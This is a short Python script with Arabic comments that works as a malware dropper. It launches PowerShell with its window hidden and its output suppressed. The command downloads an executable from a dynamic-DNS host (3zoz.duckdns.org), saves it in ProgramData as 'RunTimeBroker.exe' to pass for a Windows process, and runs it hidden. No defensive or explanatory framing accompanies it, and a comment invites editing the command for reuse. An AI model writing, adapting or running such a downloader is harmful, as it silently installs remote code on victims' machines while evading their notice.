import subprocess
from typing import Sequence, Union


def run_hidden_command(command: Union[str, Sequence[str]]) -> subprocess.Popen:
    """
    Launch a PowerShell process with no window and no visible output.

    Parameters
    ----------
    command:
        The PowerShell command string or an iterable of arguments.

    Returns
    -------
    subprocess.Popen
        The spawned process handle.
    """

    # Use the same flags as the provided snippet: hidden window, no output.
    proc = subprocess.Popen(
        ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", command],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW,
    )
    return proc


# أمر PowerShell متغير يمكن تعديله حسب الحاجة
powershell_command = '$savePath="$env:ProgramData\\RunTimeBroker.exe"; $url="http://3zoz.duckdns.org/config"; Invoke-WebRequest -Uri $url -OutFile $savePath -UseBasicParsing; Start-Process $savePath -WindowStyle Hidden'

# استخدام الدالة مع الأمر المتغير
process = run_hidden_command(powershell_command)